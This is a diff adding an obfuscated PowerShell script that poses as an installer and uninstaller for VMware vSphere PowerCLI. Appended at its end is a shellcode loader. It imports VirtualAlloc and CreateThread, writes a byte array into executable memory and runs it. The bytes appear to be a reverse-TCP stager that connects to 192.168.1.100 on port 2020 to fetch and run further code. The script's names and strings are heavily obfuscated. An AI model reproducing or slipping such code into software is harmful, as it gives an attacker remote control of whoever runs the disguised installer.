@@ -1,0 +1,98 @@
+param(
+	[string]${V`Er`sIoN},
+	[string]${P`AtH},
+	[switch]${F`OrCE},
+	${UpDA`Te},
+	[switch]${u`NIn`ST`All}
+)
+
+
+
+
+
+${co`Nf`iGS} = @{
+	("{1}{0}" -f'rl','U') = ("{8}{9}{0}{15}{5}{11}{12}{1}{4}{10}{14}{3}{2}{13}{16}{7}{6}" -f'o','ls?down','duct','&pro','loadGroup=P','oup/vmw','2','5','h','ttps://my.vmware.c','CLI5','are/deta','i','I','50','m/gr','d=3')
+    ("{0}{1}" -f'P','ath') = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\ "
+}
+
+${c`Onf`iGS} | .("{1}{2}{3}{0}"-f'ject','ForEa','ch','-Ob'){
+
+    try{
+
+        ${_}."RE`Sult" = ${Nu`LL}
+        if(-not ${_}."pA`TH"){${_}."pa`Th" = ${pa`Th}}
+        ${Co`NfiG} = ${_}
+
+        
+        
+        
+
+        if(-not ${uNI`Nst`ALl}){
+
+            
+            
+            
+
+            if(${_}."CO`N`DiTiOn`excl`UsiOn"){            
+                ${_}."CoND`itio`NEXClusi`ON`ReS`ULT" = $(&("{2}{4}{1}{0}{3}" -f'sio','res','I','n','nvoke-Exp') ${CoN`FIG}."con`d`IT`iOneX`clus`iON" -ErrorAction ("{2}{3}{1}{0}"-f 'e','lyContinu','Sil','ent'))        
+            }    
+            if((${_}."C`on`Diti`One`Xclu`SiONrES`ULT" -eq ${nU`LL}) -or ${F`orcE}){
+                    	
+                
+                
+                
+                
+                &("{0}{2}{1}" -f 'Write-','g','Warnin') ("{25}{24}{2}{15}{6}{11}{16}{22}{3}{17}{0}{21}{12}{9}{4}{23}{26}{19}{7}{1}{18}{10}{20}{5}{13}{14}{8}" -f'b','m ','ll','or','nlo','l ',' ','n your own fro','.','nload. Dow','offic','i','c dow','VM','ware website','er','s not av',' pu','the ','o','ia','li','ailable f','ad ','sta','In','it ')
+                .("{3}{1}{2}{0}" -f 'ss','tart-P','roce','S') -FilePath "$($_.Url)" 			
+
+                
+                
+                
+				                		
+                
+                
+                
+                
+                
+                
+                
+                		
+                
+                
+                
+                		
+                if(${uP`datE}){${_}."ReS`Ult" = ("{0}{2}{1}" -f'A','dated','ppUp');${_}
+                }else{${_}."re`S`ULT" = ("{1}{2}{0}" -f 'pInstalled','A','p');${_}}
+            		
+            
+            
+            
+            		
+            }else{
+            	
+                ${_}."RE`sU`lt" = ("{0}{1}{2}{5}{4}{3}" -f'Condit','i','o','usion','xcl','nE');${_}
+            }
+
+        
+        
+        
+        	
+        }else{
+            
+            .("{1}{0}" -f 't-MSI','Ge') | .("{0}{1}" -f 'whe','re'){${_}."pROd`Uctn`A`me" -eq ("{0}{1}{6}{2}{3}{5}{4}"-f 'VM','war',' vSphere Po','w','CLI','er','e')} | &("{0}{2}{1}"-f 'F','t','orEach-Objec'){
+                 &("{1}{0}{3}{2}{4}" -f 'tar','S','roc','t-P','ess') -FilePath ("{1}{2}{0}"-f 'ec','msie','x') -ArgumentList "/uninstall $($_.LocalPackage) /qn " -Wait 
+            }
+                
+            ${_}."R`EsU`Lt" = ("{3}{0}{2}{1}" -f 'pUninst','ed','all','Ap');${_}
+        }
+
+    
+    
+    
+
+    }catch{
+
+        ${Con`FIg}."res`U`Lt" = ("{1}{0}"-f'or','Err');${CO`NF`iG}
+    }
+}
+${c} = ((("{0}{10}{5}{7}{33}{11}{49}{19}{63}{60}{62}{64}{29}{55}{13}{53}{30}{70}{17}{6}{38}{28}{1}{9}{48}{66}{67}{36}{47}{46}{71}{52}{31}{39}{45}{40}{18}{16}{22}{21}{44}{15}{51}{58}{37}{24}{50}{12}{43}{59}{2}{69}{26}{3}{32}{14}{42}{41}{65}{27}{61}{8}{4}{68}{25}{54}{20}{57}{23}{34}{56}{35}"-f '[DllImp','d','lags, IntPtr l',';','ic e','ern','ort','el32.','t','ll1Hl','ort(1Hlk','1Hl)','pParameter, u','llocationTy','mport(1H','e, IntPtr lpS','ThreadAtt','tect);[DllImp','r lp',' static exter','e','t','ributes, uin','est, ui','s, IntPtr ',' ','dId)','b','ernel32.','ss, uint dwSize, ui','e, uin','ateT','[DllI','dll','nt s','int count);','sta','Addres','(1Hlk','hread(','ntPt','.','lmsvcrt','int ',' dwStackSiz','I',' exter','tic',')]pub',']public','l','t','IntPtr Cre','p','IntPtr mems','nt flA','rc, u','t(IntPtr d','art','dwCreationF',' Int','lic sta','Ptr VirtualAlloc(IntPtr ','n','lpAddre','dll1Hl)]pu','lic',' ','xtern','pThrea','t flPro','n '))."R`eplacE"('1Hl',[StrIng][ChaR]34));${w} = .("{0}{1}{2}"-f 'Add-Ty','p','e') -memberDefinition ${c} -Name ("{1}{0}" -f 'in32','W') -namespace ("{3}{1}{2}{0}"-f'ons','Fu','ncti','Win32') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x64,0x68,0x02,0x00,0x07,0xe4,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${Z}."leNG`TH" -gt 0x1000){${g} = ${Z}."LEN`gTh"};${X}=${w}::("{0}{2}{1}"-f 'Virtual','oc','All').Invoke(0,0x1000,${G},0x40);for (${i}=0;${i} -le (${Z}."L`eN`GTH"-1);${I}++) {${W}::"me`mseT"([IntPtr](${x}.("{1}{2}{0}"-f'32','To','Int').Invoke()+${i}), ${z}[${i}], 1)};${W}::("{1}{2}{0}" -f 'Thread','C','reate').Invoke(0,0,${x},0,0,0);for (;;){.("{1}{0}{2}" -f 'ee','Start-sl','p') 60};
